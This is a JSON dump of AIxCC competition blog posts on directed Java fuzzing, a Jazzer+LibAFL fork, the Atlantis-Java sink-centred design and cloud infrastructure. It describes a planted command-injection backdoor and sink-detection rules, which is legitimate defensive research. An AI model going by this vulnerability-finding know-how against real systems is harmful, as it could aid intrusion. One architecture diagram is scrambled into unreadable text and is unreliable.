java, sinkpoints","content":"Traditional coverage-based fuzzers excel at code exploration. When testing Java code, however, most vulnerabilities require the invocation of a certain Java API, such as creating an SQL statement (java.sql.Statement) for an SQL injection bug. Thus, we target such security-critical APIs with our modified, directed Jazzer to reach and exploit critical code locations faster. This blog post gives an overview over our directed fuzzing setup for Java challenge problems.\nCalculating a distance metric for directed fuzzing requires static analysis to identify critical code locations (aka sinkpoints) and compute distances. This static analysis happens mostly offline, independent of the modified Jazzer, to reduce the computational overhead in the fuzzer. However, we still compute the CFG (and, thus, basic block-level distances) in Jazzer to maintain a precise distance metric and allow the update of seed distances during fuzzing.\nFigure 1: Overview of sinkpoint-focused directed fuzzing architecture.\nSplitting up the calculation of the iCFG is also observable in the overview of our directed fuzzing architecture (Figure 1). In an ideal world, we would perform the entire static analysis outside of Jazzer to improve fuzzing performance; particularly, we need to keep the startup overhead low since Jazzer may restart frequently on certain targets, for example, if they consume large amounts of memory. However, calculating precise basic block-level distances ahead of time proves challenging under the given competition constraints.\nBasic block-level distances. There mainly exist two approaches to pre-compute basic block-level distances: 1) Assigning distances to coverage IDs and 2) assigning distances to basic blocks/instructions.\nCoverage ID Assignment: Jazzer assigns coverage IDs dynamically during class loading, making them non-deterministic. The assignment order depends on when classes get loaded during execution, which varies based on fuzzing inputs and execution paths. While Jazzer can pre-assign IDs by rewriting JAR files, we avoid this approach for competition stability reasons.\nBytecode Instruction Matching: Even if we pre-compute the CFG, matching pre-computed distances to post-instrumentation basic blocks proves challenging. Jazzer\u0026rsquo;s instrumentation modifies bytecode in ways that affect instruction offsets:\nThe runtime constant pool grows larger due to added coverage instrumentation Original instructions change from ldc to ldc_w or ldc2_w when constant pool indices exceed 8-bit limits These changes cascade through the bytecode, shifting offsets of subsequent instructions Basic block boundaries can shift unpredictably due to these instruction size changes While heuristic matching approaches exist (e.g., matching by instruction patterns or control flow signatures), the competition environment demands high reliability. False or missing matches could misdirect the fuzzer toward incorrect targets, potentially worse than no guidance at all.\nDesign Decision: Given these constraints, we split the interprocedural CFG computation: call graph analysis happens offline during static analysis, while control flow graph construction occurs online within Jazzer. This design trades some performance for precision and reliability, ensuring accurate distance calculations even as bytecode gets modified during instrumentation.\nStatic Analysis Our static analysis pipeline detects sinkpoints, checks reachability and exploitability, and calculates sinkpoint distances in the call graph. Recognizing that no single analysis tool provides complete call graph coverage, we merge the call graphs from multiple frameworks including CodeQL, Soot, and Joern as well as from dynamic execution traces. This multi-tool approach handles Java\u0026rsquo;s complex object-oriented features where interface calls and reflective invocations often confound individual analyzers.\nSinkpoint Detection. While Jazzer has a list of sinkpoint APIs which it sanitizes, we identified additional APIs that are likely to trigger vulnerabilities. Our CodeQL component establishes a framework for specifying security-sensitive APIs that extend beyond Jazzer\u0026rsquo;s built-in sanitizers. Rather than exhaustively analyzing every library dependency, our approach extends the sink API list while focusing analysis only on challenge problem code instead of all dependencies.\n# Example sink definition for java.net.URL - model: # URL(String spec) package: \u0026#34;java.net\u0026#34; type: \u0026#34;URL\u0026#34; subtypes: false name: \u0026#34;URL\u0026#34; signature: \u0026#34;(String)\u0026#34; ext: \u0026#34;\u0026#34; input: \u0026#34;Argument[0]\u0026#34; kind: \u0026#34;sink-ServerSideRequestForgery\u0026#34; provenance: \u0026#34;manual\u0026#34; metadata: description: \u0026#34;SSRF by URL\u0026#34; We added sinkpoints for additional vulnerability classes including java.math.BigDecimal (DoS), networking APIs (SSRF), validation frameworks (expression injection), and XML/SVG parsers. This approach reduces analysis time from hours to minutes by focusing only on challenge problem code rather than exhaustively analyzing all dependencies, leaving maximum time for directed fuzzing.\nReachability Analysis. We perform per-harness reachability analysis to ensure that sinkpoints are only scheduled in the directed fuzzer, if they are accessible from the harness entry point, eliminating unreachable targets that would deflect the fuzzer\u0026rsquo;s attention.\nExploitability Analysis. Beyond identification, we assess whether sinkpoints are practically exploitable by analyzing data flow patterns. When we find strong evidence that a sinkpoint is not exploitable (hardcoded arguments, untainted inputs), we filter it out. This transforms large lists of potential targets (hundreds to thousands) into manageable sets of high-value sinkpoints (typically under 100).\nMethod-Level Distance Computation. The static analysis phase pre-computes method-level distances from harness entry points to all reachable sinkpoints using the merged call graph. These cached distances are combined with the runtime basic block-level calculations, to determine the distance of a given fuzzing input.\nDirected Jazzer Our enhanced Jazzer transforms static analysis insights into dynamic fuzzing guidance through two main components:\nDistance Metric Calculation. During fuzzing execution, we compute basic block-level distances in real-time using Soot\u0026rsquo;s control flow graph analysis. The system combines pre-computed method-level distances with runtime basic block distances to guide input mutation toward sinkpoints. The distance metric itself uses an off-the-shelf formula: We calculate the average distance of each basic block given the trace of a seed, with the basic block distance being the sum of the method distance and the intra-CFG distance to the next level in the CG.\nSinkpoint Scheduling. Our scheduler schedules up to 15 concurrent sinkpoints using prioritized round-robin scheduling. The system uses two separate queues to implement prioritization: one queue contains all active sinkpoints, while a second queue contains only high-priority sinkpoints from SARIF reports or diff mode. The round-robin scheduler consideres both queues, effectively scheduling SARIF and diff-related sinkpoints twice as frequently as regular sinkpoints. This dual-queue approach ensures that competition-relevant sinkpoints receive appropriate focus while maintaining systematic coverage and a scheduling guarantee for all sinkpoints.\nEvaluation We evaluated our directed fuzzing approach on our own benchmark suite. As expected, directed fuzzing improves performance on benchmarks with certain characteristics, where sinkpoints are difficult to reach, such as ActiveMQVar. For targets where traditional fuzzing immediately reaches sinkpoints, directed fuzzing provides no additional benefit. ActiveMQVar represents a challenging case with a wide call graph and multiple code paths, making it difficult for coverage-based fuzzing to efficiently reach all specific sinkpoints.\nFigure 2: Directed fuzzing evaluation result on our ActiveMQVar benchmark.\nResults: Our directed approach achieved faster sinkpoint discovery compared to standard Jazzer after initial setup time (Figure 2). Within the 4-hour evaluation timeframe typical of the competition scenario, directed fuzzing successfully identified all 12 ground-truth vulnerabilities. The system detected additional sinkpoints beyond the 12 true positives; however, the small number of false positives did not significantly impact overall performance.\nOur investigation on the benchmark suite found that directed fuzzing provides substantial benefits in scenarios with wide call graphs where traditional approaches struggle to make progress toward specific targets. The initial overhead of static analysis and setup is quickly amortized by more efficient sinkpoint reaching, leading to faster overall vulnerability discovery.\nConclusion With our directed fuzzing framework, we ensure that the fuzzer reaches critical code locations faster than traditional approaches. By combining static analysis with runtime distance computation, we create a system that efficiently navigates toward sinkpoints while avoiding the computational overhead of full dynamic analysis. The approach proves particularly valuable in the time-constrained competition scenario where reaching security-critical code quickly is essential for effective vulnerability discovery.\nThis precision-guided approach represents a significant evolution beyond coverage-based fuzzing, focusing computational resources on the code locations that matter most for security testing.\nReferences Directed Jazzer modifications Static analysis components based on CodeQL and Soot This post is part of our series on Atlantis-Java components. We already explored our LibAFL-based Jazzer integration for enhanced mutation diversity. Check back later for more.\n"},{"section":"Blog","slug":"/blog/post-crs-java-libafl-jazzer/","title":"Jazzer+LibAFL: Insights into Java Fuzzing","description":"How we incorporated LibAFL as a new fuzzing backend for Jazzer","date":"August 19, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-java/libafl-jazzer/jazzer_plus_libafl_hu_23bb1651f2271206.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"267\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-java\\/libafl-jazzer\\/jazzer_plus_libafl_hu_f8cf71fdf029df74.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-java/libafl-jazzer/jazzer_plus_libafl_hu_a074aa50a3d82dc4.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-java\\/libafl-jazzer\\/jazzer_plus_libafl_hu_d1bcde7796ef686e.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Java","tags":"retrospective, java","content":"AIxCC involved finding bugs in software written in two languages: C++ and Java. The focus of the competition was on the use of LLMs and AI, however, our teams approach was to balance ambitious strategies alongside proven traditional bug-finding techniques like fuzzing. While our team was deeply familiar with fuzzing C++ from decades of academic research and industry work, Java was uncharted territory for us. In part of our Java fuzzing development we created a fork of Jazzer that uses LibAFL as the fuzzing backend and it is available as part of our open source release. This post details some of the lessons we learned about Java fuzzing and the creation of this fork.\nDARPA chose Jazzer as their baseline fuzzer and sanitizer framework for Java challenges.\nJazzer Jazzer is an open-source Java Fuzzer developed by the Code Intelligence company. It makes use of LibFuzzer (written in C++) using the Java Native Interface (JNI). The architecture of Jazzer is roughly:\nr J J u T P a a n a r v z O r o a z n g g e e e r r ( t a ) m J J N N S I I a n C o v 1 2 f . . u U z p L z d L * _ a V f t t t M u a e e L F z r s i u z g t L b z i e O i C F z n t n b + u e g _ e F + z r r I u z R l u n z e u o n p z r n o n u e D p e t r r * r i . f v c e e p e r p d b a c k Jazzer begins by using the JNI to make a call to LLVMFuzzerRunDriver which is LibFuzzer\u0026rsquo;s recommended way of using it as a library. This starts the C++ fuzzing loop inside libFuzzer where Jazzer\u0026rsquo;s stub fuzz driver fuzz_target_runner.cpp implements a testOneInput method. This method is very simple and uses the JNI to call to a private static int runOne(long dataPtr, int dataLength) in Java.\nFrom here, Jazzer takes the void* input from LibFuzzer and converts it into the appropriate type before handing it off to the Java fuzzing entrypoint such as fuzzerTestOneInput(byte[] input).\nOn the Java side of things, Jazzer makes use of the JaCoCo code coverage library and ASM to inject instrumentation hooks into the program\u0026rsquo;s edges. These coverage tracking hooks insert a call to the recordCoverage(int id) method in CoverageMap.java. Jazzer here uses the UNSAFE.putByte function from sun.misc.Unsafe to directly write the edge into the coverage map memory location. LibFuzzer makes use of the LLVM Sanitizer Coverage (SanCov) API to receive coverage feedback. Jazzer hooks into this system by using the __sanitizer_cov_pcs_init method to set where in memory the coverage map is being stored.\nWhen control flow returns from the Java fuzzerTestOneInput program and flows back to the fuzzing loop inside LibFuzzer, it can now mutate the input and we can successfully fuzz a Java program.\nNote: This explanation glosses over details such as how Jazzer also instruments comparison functions and provides them to LibFuzzer for value-feedback based mutation.\nThe State of Jazzer and LibFuzzer Unfortunately, right as the AIxCC competition started, Code Intelligence announced that they had stopped maintaining Jazzer as an open-source project in favor of their commercial offerings. That change has since been reverted, however, Jazzer has not had any substantial new features or optimizations made to it since then.\nAdditionally, LibFuzzer, while it is a very mature and well-built fuzzer is also on maintenance mode. LibFuzzer was created by Kostya Serebryany under the LLVM umbrella when he was employed at Google but since then Google\u0026rsquo;s priorities have shifted. The LibFuzzer documentation notes:\nThe original authors of libFuzzer have stopped active work on it and switched to working on another fuzzing engine, Centipede. LibFuzzer is still fully supported in that important bugs will get fixed. However, please do not expect major new features or code reviews, other than for bug fixes.\nJust because Jazzer and LibFuzzer are in maintenance mode doesn\u0026rsquo;t mean the rest of the fuzzing community is. Projects like AFL++ have continued to incorporate ideas from research work and industry creating far more capable fuzzers.\nJazzer+LibAFL This brings us to one area we worked on: using LibAFL as the fuzzing engine for Jazzer instead of LibFuzzer. LibAFL is an awesome project that can be summarized as a fuzzer-library. Instead of an end-to-end fuzzer, you code the bits of glue that deliver your fuzzing payload and provide feedback and in return you get a fast performant fuzzer.\nImportantly for us, LibAFL contains a sub-project called libafl_libfuzzer. This is meant to be a drop-in replacement for LibFuzzer that can use harnesses and binaries built for LibFuzzer but fuzz them using LibAFL. This seemed like a great thing to try out for us to get the advanced features in LibAFL for free. As some of our past work like autofz has demonstrated, ensembling a bunch of different fuzzers with varying characteristics tends to yield great results when fuzzing.\nImplementation It wasn\u0026rsquo;t quite a drop-in replacement experience for us: it turned out that Jazzer actually used a fork for LibFuzzer with some changes made and libafl_libfuzzer wasn\u0026rsquo;t entirely feature-complete. However, a few days of integration left us with a Jazzer derivative that seemed to be able to explore code paths complimentary to the base fuzzer. Some of the notable changes we had to make are below:\nJazzer added a feature to LibFuzzer to allow the fuzzing loop to stop and return control to the caller of LLVMFuzzerRunDriver instead of killing the entire program.\nWe added the same feature in libafl_libfuzzer:\nlet result = unsafe { crate::libafl_libfuzzer_test_one_input(Some(*$harness), buf.as_ptr(), buf.len()) }; match result { -2 =\u0026gt; { // A special value from Jazzer indicating we should stop // the fuzzer but not kill the whole program. *stop_fuzzer.borrow_mut() = true; eprintln!(\u0026#34;[libafl] Received -3 from harness, setting stop.\u0026#34;); ExitKind::Crash } Sanitizers in C/C++ programs usually trigger signals to indicate an issue, such as AddressSanitizer (ASan) raising a SIGSEGV when it detects an error. Jazzer instead uses a method called __jazzer_set_death_callback to indicate a corpus triggered an issue in a sanitizer. We added this same function to our libafl_libfuzzer.\nAs mentioned previously, LibFuzzer uses SanCov to gather coverage information. This isn\u0026rsquo;t the only thing that SanCov provides though: in an effort to quickly find magic numbers like 0xdeadbeef when fuzzing, SanCov also hooks onto comparisons and calls methods like __sanitizer_cov_trace_cmp8 to indicate a comparison between two 8-byte numbers. This method is implemented like so in LibFuzzer:\nvoid __sanitizer_cov_trace_cmp8(uint64_t Arg1, uint64_t Arg2) { uintptr_t PC = reinterpret_cast\u0026lt;uintptr_t\u0026gt;(GET_CALLER_PC()); fuzzer::TPC.HandleCmp(PC, Arg1, Arg2); } Notice that it uses a macro to retrieve the calling program counter. If Jazzer were to use these methods from the JNI directly, they would all register with the same program counter. Hence Jazzer adds variants of these methods such as __sanitizer_cov_trace_cmp8_with_pc that pass the program counter.\nWe implemented these same _with_pc SanCov functions.\nLibFuzzer also gathers data on comparisons performed in strcmp, memcmp and other common libc functions to find magic strings. This is done by intercepting calls to these methods in FuzzerInterceptors.cpp:\nstatic void fuzzerInit() { ... REAL(memcmp) = reinterpret_cast\u0026lt;memcmp_type\u0026gt;( getFuncAddr(\u0026#34;memcmp\u0026#34;, reinterpret_cast\u0026lt;uintptr_t\u0026gt;(\u0026amp;memcmp))); ... } ATTRIBUTE_INTERFACE int memcmp(const void *s1, const void *s2, size_t n) { int result = REAL(memcmp)(s1, s2, n); void *caller_pc = GET_CALLER_PC(); __sanitizer_weak_hook_memcmp(caller_pc, s1, s2, n, result); return result; } and then sending the arguments and result to functions like __sanitizer_weak_hook_memcmp. Here we encountered two issues, libafl_libfuzzer lacked implementations for __sanitizer_weak_hook_memmem and __sanitizer_weak_hook_strstr. We added those two methods.\nAdditionally, Jazzer had implemented a custom hook function called __sanitizer_weak_hook_compare_bytes which we also had to implement.\nThere were also many other smaller changes such as making the libafl_libfuzzer crash filenames match the filename that LibFuzzer uses. We are thankful to the Jazzer team for having such a thorough set of unit tests and integration tests that allowed us to be confident our fork of Jazzer would work.\nThe Bugs! During this process we found a few bugs in the libafl_libfuzzer drop-in replacement. We fixed some of these locally and reported them upstream wherever we could.\nA build issue had caused the function interceptor hooks like __sanitizer_weak_hook_memcmp to become dead. This meant that these hooked functions were just silently never getting called reducing the feedback the fuzzer had to work with.\nhttps://github.com/AFLplusplus/LibAFL/issues/3043\nThe calls for constant comparisons such as __sanitizer_cov_trace_cmp8 to represent 8-byte integer comparison had an incorrect macro implementation causing all comparisons to be considered as 1-byte.\nhttps://github.com/AFLplusplus/LibAFL/issues/3094\nlibafl_libfuzzer is sometimes unable to solve some simple harnesses because its memory-comparison hooks do not provide feedback on how close the values being compared are.\nhttps://github.com/AFLplusplus/LibAFL/issues/3042\nWe reported this bug upstream but did not contribute our fix because it was a little hacky.\nReference Code Repository Technical Report (forthcoming) "},{"section":"Blog","slug":"/blog/post-crs-java-overview/","title":"Atlantis-Java: A Sink-Centered Approach to Java Vulnerability Detection","description":"Overview of Atlantis-Java","date":"August 19, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-java/overview/icon_hu_65c45f813ce97ae2.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"280\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-java\\/overview\\/icon_hu_1e0fb8b5fb8556f7.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/crs-java/overview/icon_hu_7a39bb092b57c9b6.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/crs-java\\/overview\\/icon_hu_46524b095c49bde1.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis-Java","tags":"java","content":"Atlantis-Java is a specialized bug-finding subsystem within the Atlantis CRS framework, specifically designed for Java CPV detection in the AIxCC competition. It integrates fuzzing, program analysis, and LLM capabilities, with a particular focus on security-sensitive APIs (also known as sinks).\nMany Java Vulnerabilities Are Sink-Centered Fig.1 Example CPV from AIxCC Semifinal Jenkins CP\nThis vulnerability contains a backdoor that enables OS command injection when specific conditions are met. The ProcessBuilder constructor serves as a sink API, where an attacker-controllable first argument can lead to arbitrary command execution. The sinkpoint (line 20) refers to the location in the target CP where this sink API is called.\nFrom a sink-centered perspective, the detection process can be decomposed into two phases:\n1. Sink exploration (lines 3-8, 12-19). To reach the sink, the input must satisfy:\nThe presence of an x-evil-backdoor key in the HTTP request header The header value matching DigestUtils.sha256(\u0026quot;breakin the law\u0026quot;) Non-empty command line arguments: cmd != null \u0026amp;\u0026amp; cmd.trim().isEmpty() 2. Sink exploitation (lines 20-23). The input must satisfy:\nTriggering the Jazzer detection oracle: cmds[0] should equal to the canary string jazze This two-phase process effectively captures the detection pattern for various types of Java vulnerabilities. Security issues typically arise from the unsafe usage of sensitive API calls (sinks), such as file operations, deserialization, network access, and template rendering.\nIn practice, each vulnerability type presents unique exploration and exploitation challenges that go beyond simply executing the sink and setting the canary value. For example, the CPVs in the Apache Tika CP require a nested zip file to reach a sinkpoint and also demand reasoning to bypass normalization guard conditions.\nHowever, existing fuzzers, mostly inherited from C/C++ fuzzers, are coverage-centered and leverage only limited sink knowledge to enhance exploration and exploitation.\nOverview of Atlantis-Java Fig.2 Overview of Atlantis-Java\nRather than replacing traditional fuzzing approaches, Atlantis-Java augments them with sink knowledge to achieve more effective Java vulnerability detection by integrating LLM capabilities with dynamic and static analysis techniques.\nAt its foundation, Atlantis-Java maintains an ensemble fuzzing pipeline that serves as the foundational infrastructure. Built upon this pipeline, it performs sink analysis on the target CP and applies multiple techniques to enhance both sink exploration and exploitation. These techniques generate inputs and dictionaries that strengthen the fuzzing pipeline while simultaneously retrieving dynamic information from fuzzers to refine the analysis process.\nThe following paragraphs list the framework level designs and facilities in Atlantis-Java.\n1. Sink-Aware Fuzzing Loop while not timeout: seed = pick from corpus mutated = mutate(seed) execute(program, mutated) if new_coverage: add mutated to corpus if reaches_sinkpoint: collect as beep_seed try_exploitation(beep_seed) if has_crash: save_crash(mutated) The fuzzing loop in Atlantis-Java operates in a sink-aware manner. Every input that reaches a sinkpoint (referred to as \u0026ldquo;beep seeds\u0026rdquo;) is collected and elevated to a dedicated exploitation phase. All contextual information from beep seeds, such as stack traces and sink API details, is preserved and shared within Atlantis-Java for further exploitation. This functionality is implemented through a custom Java instrumentation pass integrated into all our Jazzer instances.\n2. Ensemble Fuzzing The ensemble fuzzing infrastructure collects, deduplicates, and dispatches corpus data among all fuzzer instances, serving as both a corpus synchronization layer and a metadata propagation channel. This ensures that all components benefit from collective discoveries.\nCorpus Synchronization: Collects and distributes corpus data among different fuzzer instances while performing deduplication based on coverage metrics Input Integration: Incorporates inputs from non-fuzzing components such as Path-Based PoV Generator, Concolic Executor, and ExpKit Metadata Propagation: Synchronizes sinkpoint dynamic information, including sinkpoint reach/exploit status, beep seeds and their contexts 3. Sink Management Sinkpoints are first-class citizens in Atlantis-Java. Their management encompasses identification, deduplication, filtering, metadata synchronization, and scheduling.\nSinkpoint Identification: Static analysis locates all calls to security-sensitive APIs. Beyond Jazzer\u0026rsquo;s built-in API list, we expanded detection by collecting APIs from vulnerability benchmarks, research papers, and competition tools. Additionally, for diff code in delta mode, we identify code areas potentially causing infinite loops as custom sinkpoints.\nTask Transformation: All competition tasks are converted into concrete sinkpoint targets:\nFull Mode → All sinkpoints in the CP Delta Mode → Sinkpoints contained in or reachable by code changes SARIF Challenge → Sinkpoints specified in reports Metadata Management: Sinkpoint information is collected and synchronized both within and across Atlantis-Java instances to prevent duplicate exploration/exploitation efforts and ensure proper prioritization. This includes sinkpoint basics (API, potential vulnerability type, coordinates), runtime status tracking (unreached/reached/exploited/unexploitable), and associated beep seeds and crashes.\nScheduling: The scheduler prioritizes unreachable sinkpoints over reachable ones during the exploration phase to maximize coverage, while exploited sinkpoints are excluded from the exploitation phase to avoid redundant efforts. Additionally, sinkpoints related to delta mode and SARIF challenges receive higher priority to align with competition objectives.\n4. Distributed Design Atlantis-Java incorporates lightweight distributed designs optimized for Kubernetes deployment and competition tasks.\nFull Mode: Each CP harness operates on a dedicated Kubernetes node, working independently until timeout. NFS and Redis services provide persistent caching infrastructure that enables progress recovery when components or the system restart.\nDiff Mode: A one-time node rescheduling occurs either at timeout (set to 2 hours in the final competition) or upon completion of unified reachability analysis from all static analyzers. This rescheduling allocates additional computing resources to diff-reachable harnesses. Following rescheduling, Atlantis-Java synchronizes all cached sinkpoint metadata from Redis, avoiding redundant efforts.\nComponents in Atlantis-Java The framework integrates multiple specialized tools for sinkpoint exploration and exploitation:\nExploration-focused components\nDirected-Jazzer: Guides fuzzing toward potentially reachable sinkpoints LibAFL-Jazzer: Leveraging libAFL mutators for more diverse input mutations DeepGen: LLM-based input generation script generator DictGen: LLM-based fuzzing dictionary generation Exploitation-focused components\nExpKit: LLM-based exploitation tool, start exploitation from beep seed Dual-purpose components:\nPath-Based PoV Generator: LLM-based PoV generator towards sinkpoints Concolic Executor: Graal VM based concolic executor How Does Atlantis-Java Perform? While we don\u0026rsquo;t have full log for post-mortem analysis, the recovered logs have recorded 107 deduplicated PoV submissions (122 in total, 15 submission logs were lost..) from Atlantis to organizers. Among them, 23 submissions are of Java CPs and Atlantis-Java submitted 15 of them, which is a strong indicator for its effectiveness.\nWhat\u0026rsquo;s Next Individual blog posts detailing each component Application to open-source projects Comprehensive technical report with in-depth analysis Extended post-mortem analysis as more data becomes available Reference Atlantis-Java Code Repository Technical Report (forthcoming) "},{"section":"Blog","slug":"/blog/post-atl-infra/","title":"Atlantis Infrastructure","description":"Atlantis Infrastructure","date":"August 13, 2025","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/atl-infra/infra_hu_66fae50b5b3588d3.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"420\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/atl-infra\\/infra_hu_c3d73c1b5704794c.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/atl-infra/infra_hu_861da9d828610e3f.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/atl-infra\\/infra_hu_2920da624ffa59bd.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Atlantis","tags":"infrastructure","content":"The AIxCC competition is not just about creating automated bug-finding and patching techniques \u0026ndash; it is about building a cyber reasoning system (CRS) that can do both without any human assistance. To succeed, a CRS must excel in four critical infrastructure areas:\nReliability: Run continuously for weeks without intervention. Scalability: Handle many challenge projects concurrently. Budget Utilization: Maximize Azure cloud and LLM credit usage. Submission Management: Consistently deliver valid proof-of-vulnerability blobs (POVs), Patches, SARIF assessments, and Bundles. In this post, we will share how we designed the infrastructure of our CRS, Atlantis, to meet these keys and make it as robust as possible. We could not have won AIxCC without the exceptional work of our infrastructure team.\n1. Bootstrapping Atlantis starts by launching CRS-level k8s nodes for four essential services:\nCRS Webserver: Listens for incoming challenge projects (CPs) and SARIF reports. Log Collector: Aggregates and forwards logs to the AIxCC organizers. LiteLLM: Manages LLM usage within budget and logs all requests/responses. Custom LLM: Helps patch generation based on fine-tuned LLM. 2. Per-Challenge Scaling When a new CP arrives, the CRS webserver spins up a dedicated CP manager on its own k8s node. The CP manager then:\nBuilds the CP and allocates both Azure Cloud and LLM budgets proportionally for this CP.\nLaunches bug-finding modules depending on the language:\nC-based CPs =\u0026gt; Atlantis-Multilang + Atlantis-C Java-based CPs =\u0026gt; Atlantis-Multilang + Atlantis-Java Launches Atlantis-Patch and Atlantis-SARIF for patch generation and SARIF assessment.\nIssues LiteLLM API keys to modules to enforce per-CP and per-module LLM budgets.\nThis per-challenge scaling significantly boosts reliability \u0026ndash; if crash while handling one CP, it does not affect others. Redundant bug-finding modules further improve stability and coverage; for example, if Atlantis-C fails on certain CPs, Atlantis-Multilang can still find vulnerabilities in them.\nHere are the statistics on POVs from the final competition.\n+--------------------+--------------------------+ | Module | POV Submission by Module | +--------------------+--------------------------+ | Atlantis-Multilang | 69.2% | | Atlantis-C | 16.8% | | Atlantis-Java | 14.0% | +--------------------+--------------------------+ +-------------+---------------------------------+ | CP Language | POV Distribution by CP Language | +-------------+---------------------------------+ | C-based | 78.5% | | Java-based | 21.5% | +-------------+---------------------------------+ In addition, for each harness in a CP, Atlantis-Multilang and Atlantis-Java run on nodes sized according to the allocated Azure budget, while Atlantis-C operates on a fixed pool of up to 15 nodes. This isolation ensures that even if a module fails on one harness, it does not impact the others.\nThis per-challenge scaling also enabled us to make full use of the allocated Azure Cloud and LLM credit budgets. In the final round, as shown below, we recorded the highest usage among all seven teams \u0026ndash; spending $73.9K of the $85K Azure Cloud budget and $29.4K of the $50K LLM credit budget.\nNotably, the above image and the AIxCC organizers show that we primarily used o4-mini, GPT-4o, and o3. However, these are based on the number of requests rather than the actual LLM credits spent in dollars. Based on our experience from the practice and internal rounds, we allocated LLM budgets in the final round as shown below. While our plan was to rely mostly on Anthropic and OpenAI models in the final round, we do not yet have precise data on how much we spent for each provider.\n+--------------------+-----------+------------+----------+--------+-----------+ | CRS | OpenAI | Anthropic | Gemini | Grok | Total | +--------------------+-----------+------------+----------+--------+-----------+ | Atlantis-multilang | 0.48 | 0.48 | 0.05 | 0.00 | 1.00 | | Atlantis-C/java | 0.40 | 0.30 | 0.30 | 0.00 | 1.00 | | Atlantis-patch | 0.30 | 0.60 | 0.10 | 0.00 | 1.00 | +--------------------+-----------+------------+----------+--------+-----------+ | Atlantis-multilang | $8839.29 | $8839.29 | $883.93 | $0.00 | $18562.50 | | Atlantis-C/java | $7425.00 | $5568.76 | $5568.76 | $0.00 | $18562.50 | | Atlantis-patch | $3712.50 | $7425.00 | $1237.50 | $0.00 | $12375.00 | | Atlantis-sarif | $75.00 | $100.00 | $250.00 | $75.00 | $500.00 | +--------------------+-----------+------------+----------+--------+-----------+ | Total | $20051.79 | $21933.04 | $7940.18 | $75.00 | $50000.00 | +--------------------+-----------+------------+----------+--------+-----------+ 3. Submission and Task Management When a bug-finding module discovers a POV, it sends the result to the CP Manager. The CP Manager then:\nVerifies that the POV indeed triggers a crash. Deduplicates POVs based on their stack traces and heuristics. Submit unique POVs to the AIxCC organiziers. Forwards unique POVs to Atlantis-Patch and Atlantis-SARIF for patch generation and SARIF assessment. Once patches and SARIF reports are produced, they are returned to the CP Manager and CP Manager submits them to the AIxCC organizers. At the end, the CP Manager groups each POV with its corresponding patch and assessment (based on the POV hash) into a bundle and submits it to the AIxCC organizers.\nAs a result, we were able to successfully submit numerous 